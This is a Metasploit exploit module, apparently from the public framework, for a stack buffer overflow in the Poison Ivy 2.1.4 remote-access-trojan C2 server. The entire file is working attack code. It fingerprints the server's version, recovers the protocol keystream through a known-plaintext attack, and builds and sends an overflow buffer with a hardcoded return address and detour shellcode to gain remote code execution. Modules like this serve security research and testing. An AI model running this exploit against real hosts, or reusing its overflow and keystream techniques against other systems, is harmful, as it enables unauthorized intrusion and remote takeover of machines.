##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Poison Ivy 2.1.x C2 Buffer Overflow',
      'Description'    => %q{
        This module exploits a stack buffer overflow in the Poison Ivy 2.1.x C&C server.
        The exploit does not need to know the password chosen for the bot/server communication.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Jos Wetzels' # Vulnerability Discovery, exploit & Metasploit module
        ],
      'References'     =>
        [
          [ 'URL', 'http://samvartaka.github.io/exploitation/2016/06/03/dead-rats-exploiting-malware' ],
        ],
      'DisclosureDate' => 'Jun 03 2016',
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'thread',
        },
      'Payload'        =>
        {
          'Space'             => 0x847 # limited by amount of known plaintext (hard upper limit is 0xFFD)
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          [
            'Poison Ivy 2.1.4 on Windows XP SP3',
            {
              'Ret' => 0x00469159, # jmp esp from "Poison Ivy 2.1.4.exe"
              'StoreAddress' => 0x00520000, # .tls section address from "Poison Ivy 2.1.4.exe"
              'InfoSizeOffset' => 0x1111, # offset of InfoSize variable
              'DecompressSizeOffset' => 0x1109, # offset of DecompressSize variable
              'Packet2Offset' => 0xB9E # offset of second packet within server's response
            }
          ]
        ],
      'DefaultTarget'  => 0
    ))

    register_options(
      [
        Opt::RPORT(3460)
      ], self.class)

  end

  # XOR two strings
  def xor_strings(s1, s2)
    s1.unpack('C*').zip(s2.unpack('C*')).map{ |a,b| a ^ b }.pack('C*')
  end

  # Obtain keystream using known plaintext
  def get_keystream(ciphertext, knownPlaintext)
    if(ciphertext.length < knownPlaintext.length)
      return xor_strings(ciphertext, knownPlaintext[0, ciphertext.length])
    else
      return xor_strings(ciphertext, knownPlaintext)
    end
  end

  # Apply keystream to plaintext
  def use_keystream(plaintext, keyStream)
    if(keyStream.length > plaintext.length)
      return xor_strings(plaintext, keyStream[0, plaintext.length])
    else
      return xor_strings(plaintext, keyStream)
    end
  end

  def check
    connect
    # Poke
    sock.put("\x01")
    # Fetch response
    response = sock.get_once(6)

    if (response == "\x89\xFF\x90\x0B\x00\x00")
      vprint_status("Poison Ivy C&C version 2.1.4 detected.")
      return Exploit::CheckCode::Appears
    elsif (response == "\x89\xFF\x38\xE0\x00\x00")
      vprint_status("Poison Ivy C&C version 2.0.0 detected.")
      return Exploit::CheckCode::Safe
    end

    return Exploit::CheckCode::Safe
  end

  # Load known plaintext chunk
  def load_c2_packet_chunk
    path = ::File.join(Msf::Config.data_directory, 'exploits', 'poison_ivy_c2', 'chunk_214.bin')
    chunk = ::File.open(path, 'rb') { |f| chunk = f.read }
    chunk
  end

  def exploit
    # Known plaintext from C2 packet
    knownPlaintext1 = "\x89\x00\x69\x0c\x00\x00"
    knownPlaintext2 = load_c2_packet_chunk()

    # detour shellcode (mov eax, StoreAddress; jmp eax)
    detourShellcode =  "\xB8" + [target['StoreAddress']].pack("V") # mov eax, StoreAddress
    detourShellcode << "\xFF\xE0" # jmp eax

    # Padding where necessary
    compressedBuffer = payload.encoded + Rex::Text.rand_text_alpha(0xFFD - payload.encoded.length)

    # Construct exploit buffer
    exploitBuffer =  Rex::Text.rand_text_alpha(4)              # infoLen (placeholder)
    exploitBuffer << compressedBuffer                          # compressedBuffer
    exploitBuffer << "\xFF" * 0x104                            # readfds
    exploitBuffer << Rex::Text.rand_text_alpha(4)              # compressionType
    exploitBuffer << Rex::Text.rand_text_alpha(4)              # decompressSize (placeholder)
    exploitBuffer << Rex::Text.rand_text_alpha(4)              # pDestinationSize
    exploitBuffer << Rex::Text.rand_text_alpha(4)              # infoSize (placeholder)
    exploitBuffer << Rex::Text.rand_text_alpha(4)              # headerAllocSize
    exploitBuffer << [target['StoreAddress']].pack("V")        # decompressBuffer
    exploitBuffer << Rex::Text.rand_text_alpha(4)              # decompressBuffer+4
    exploitBuffer << Rex::Text.rand_text_alpha(4)              # lParam
    exploitBuffer << Rex::Text.rand_text_alpha(4)              # timeout
    exploitBuffer << Rex::Text.rand_text_alpha(4)              # hWnd
    exploitBuffer << Rex::Text.rand_text_alpha(4)              # s
    exploitBuffer << Rex::Text.rand_text_alpha(4)              # old EBP
    exploitBuffer << [target['Ret']].pack("V")    # EIP
    exploitBuffer << [target['StoreAddress']].pack("V")  # arg_0
    exploitBuffer << detourShellcode # detour to storage area

    # Calculate values
    allocSize = exploitBuffer.length + 1024
    infoLen = payload.encoded.length
    infoSize = (infoLen + 4)

    # Handshake
    connect
    print_status("Performing handshake...")

    # Poke
    sock.put("\x01")

    # Fetch response
    response = sock.get(target['Packet2Offset'] + knownPlaintext1.length + infoSize)

    eHeader = response[target['Packet2Offset'], 6]
    eInfo = response[target['Packet2Offset'] + 10..-1]

    if ((eHeader.length >= knownPlaintext1.length) and (knownPlaintext1.length >= 6) and (eInfo.length >= knownPlaintext2.length) and (knownPlaintext2.length >= infoSize))
      # Keystream derivation using Known Plaintext Attack
      keyStream1 = get_keystream(eHeader, knownPlaintext1)
      keyStream2 = get_keystream(eInfo, knownPlaintext2)

      # Set correct infoLen
      exploitBuffer = [infoLen].pack("V") + exploitBuffer[4..-1]

      # Set correct decompressSize
      exploitBuffer = exploitBuffer[0, target['DecompressSizeOffset']] + [infoSize].pack("V") + exploitBuffer[(target['DecompressSizeOffset'] + 4)..-1]

      # Build packet
      malHeader = use_keystream("\x89\x01" + [allocSize].pack("V"), keyStream1)

      # Encrypt infoSize bytes
      encryptedExploitBuffer = use_keystream(exploitBuffer[0, infoSize], keyStream2) + exploitBuffer[infoSize..-1]

      # Make sure infoSize gets overwritten properly since it is processed before decryption
      encryptedExploitBuffer = encryptedExploitBuffer[0, target['InfoSizeOffset']] + [infoSize].pack("V") + encryptedExploitBuffer[target['InfoSizeOffset']+4..-1]

      # Finalize packet
      exploitPacket = malHeader + [encryptedExploitBuffer.length].pack("V") + encryptedExploitBuffer

      print_status("Sending exploit...")
      # Send exploit
      sock.put(exploitPacket)
    else
      print_status("Not enough keystream available...")
    end

    select(nil,nil,nil,5)
    disconnect
  end

end
